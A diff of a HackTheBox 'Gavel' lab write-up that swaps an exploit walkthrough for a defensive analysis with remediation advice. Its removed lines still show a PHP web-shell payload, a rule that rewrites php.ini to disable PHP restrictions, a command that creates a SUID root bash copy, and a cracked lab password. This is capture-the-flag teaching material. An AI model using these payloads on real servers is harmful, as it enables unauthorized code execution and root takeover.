@@ -1,8 +1,9 @@
 ---
 id: HTB-2026-GAVEL
 title: Gavel
-excerpt: An exposed PHP Git repository reveals SQL injection and administrator credentials, leading to runkit RCE and a SUID privilege escalation.
+excerpt: "Exposed source, SQL injection, dynamic PHP rules, and a privileged rule runner: tracking the distinct controls that fail on Gavel."
 date: '2025-11-29'
+updated: "2026-10-13"
 tags:
   - WRITEUP
   - HACKTHEBOX
@@ -20,97 +21,43 @@ icon: Terminal
 author: '0x7CC'
 ---
 
-## TL;DR
-On **Gavel**, initial access starts with an exposed git repository that leaks administrative credentials via SQL Injection. Using the credentials, we log in to the administrative panel and exploit a PHP `runkit_function_add` injection to get remote code execution as `www-data`. Privilege escalation is achieved by abusing a vulnerable custom binary `gavel-util` which executes PHP rules, allowing us to bypass PHP restrictions and spawn a SUID root bash shell.
+## Chain and evidence
 
----
+The Gavel account describes source recovery from an exposed `.git`, SQL injection in `inventory.php`, password recovery for `auctioneer`, web execution through auction rules, and root execution through `/usr/local/bin/gavel-util`.
 
-## Target
-- Host: `gavel.htb`
-- IP: `10.129.8.61`
+It lacks the complete injection request, query, executable analysis, and runner transcript. Its excerpts support a mechanism discussion, not an independently reproduced chain. Keep source disclosure, database extraction, and credential reuse as separate observations.
 
----
+## Source disclosure guides database testing
 
-## Recon: Git leakage and SQL injection
+The target is `gavel.htb`, with SSH and a PHP application. A readable Git directory can reveal routes and query construction. It does not itself return database rows: injection still requires a reachable vulnerable query and sufficient database permissions.
 
-### Ports Scan
-- **Port 22/tcp**: SSH
-- **Port 80/tcp**: HTTP (PHP/Apache)
+The account reports recovery of a bcrypt password for `auctioneer`. This is offline guessing, not reversal of bcrypt. A minimal unauthorized query result distinguishes SQL injection from a secret simply committed to a repository.
 
-We locate an exposed `.git` repository. Extracting it reveals the source code of the web application. Analyzing the PHP files reveals a SQL Injection vulnerability in `inventory.php`.
-
-By exploiting this SQL Injection, we dump the database and crack a bcrypt password hash:
-- Username: `auctioneer`
-- Password: `midnight1`
-
----
-
-## Initial Foothold: RCE via runkit PHP injection
-
-Using the recovered credentials, we access the admin portal at `admin.php`. The portal allows modifying auction rules, which are dynamically evaluated using PHP's `runkit_function_add` function. 
-
-We submit a malicious rule containing a PHP backdoor payload:
+An illustrative PDO replacement for a value-based inventory lookup is:
 
 ```php
-file_put_contents('../shell.php', '<?php system($_GET["c"]); ?>'); return true;
+$stmt = $pdo->prepare('SELECT name FROM inventory WHERE id = :id');
+$stmt->execute(['id' => $validatedId]);
 ```
 
-By placing a bid, the rule executes and writes the web shell to `shell.php`. We trigger a reverse shell to gain execution as `www-data`, then use the known credentials to switch to the user `auctioneer`.
+`$pdo` is an existing connection and `$validatedId` a validated identifier. [PDO::prepare](https://www.php.net/manual/en/pdo.prepare.php) separates values from syntax; dynamic table names and sorting expressions need separate allowlists.
 
----
+## Auction rules are executable code
 
-## Privilege Escalation: Custom SUID gavel-util Exploitation
+The account describes an administrator modifying a rule and a bid triggering `runkit_function_add`. The [runkit7 API documentation](https://www.php.net/manual/en/function.runkit7-function-add.php) documents function creation from supplied code. Confirm the lab's actual extension/version rather than silently substituting this API into its source.
 
-Local enumeration reveals a custom binary at `/usr/local/bin/gavel-util` which runs with high privileges. It processes submitted YAML configuration files and evaluates dynamic PHP rules.
+An administrator authorized to adjust bidding criteria need not be authorized to write executable PHP. Exploitation requires rule evaluation, suitable write permissions, and reachability of the resulting file. The account reports `www-data` execution and credential reuse as `auctioneer`; saving a rule alone does not demonstrate either transition.
 
-To bypass PHP security restrictions (`disable_functions` and `open_basedir`), we first submit a YAML file that overwrites the local `php.ini` configuration:
+## The privileged runner amplifies the same design
 
-```yaml
-# fix_ini.yaml
-name: fixini
-rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
-```
+The account identifies `gavel-util` as a SUID YAML rule runner and reports modifying `/opt/gavel/.config/php/php.ini` before a later privileged rule. The ordering matters: a changed file affects only a process that loads it at the relevant time.
 
-Next, we submit a second YAML file containing code to copy bash and apply SUID permissions:
+A SUID bit alone does not establish that child PHP retains root. Verify ownership, effective UID, privilege handling, loaded configuration and directory writability. Root access is reported without those traces. The shell-creation payloads are omitted rather than presented as a complete recipe.
 
-```yaml
-# rootshell.yaml
-name: rootshell
-rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
-```
+## Remediation and retest
 
-We run the tool:
-```bash
-/usr/local/bin/gavel-util submit rootshell.yaml
-```
+Exclude `.git` from deployment and web serving; rotate leaked secrets. Parameterize database values and narrow database permissions. Replace executable bidding rules with constrained data and explicitly supported operators.
 
-This triggers the rule as root, dropping a SUID bash shell. We run `/opt/gavel/rootbash -p` to access root.
+Retire SUID rule execution or separate privileged operations from untrusted evaluation. Protect interpreter configuration and all parent directories; PHP restrictions do not replace an execution boundary.
 
----
-
-## Defensive notes / remediation
-
-### Fix
-- Ensure that the `.git` directory is not exposed publicly on production servers.
-- Do not use dangerous dynamic evaluation libraries like `runkit` with user-controlled input.
-- Secure local binaries and avoid evaluating untrusted PHP rules in processes running with elevated privileges.
-
-### Monitoring / detection ideas
-- Audit filesystem activity on configuration directories like `/opt/gavel/.config/php/`.
-- Detect execution of SUID binaries created in temporary folders.
-
----
-
-## Lessons learned
-- Exposed git repositories frequently leak database credentials and administrative endpoints.
-- SUID binaries executing dynamic scripting engines are easy privilege escalation targets.
-
----
-
-## Appendix: Timeline summary
-1. Recon -> Extract git repo, find SQL injection, crack database password.
-2. Exploitation -> Inject PHP code into runkit evaluator to obtain a shell as `www-data`.
-3. User -> Switch to `auctioneer` using cracked credentials.
-4. Privilege Escalation -> Abuse `gavel-util` rule processing to disable PHP restrictions and create a SUID root shell.
-
----
+Verify that repository paths are inaccessible, injection-shaped input remains data, legitimate auctions work, and rule authors cannot write executable files or interpreter configuration. Monitor Git requests, unexpected PHP writes, runner executions, and configuration changes followed by interpreter startup. This correlation distinguishes the initial leak from escalation.
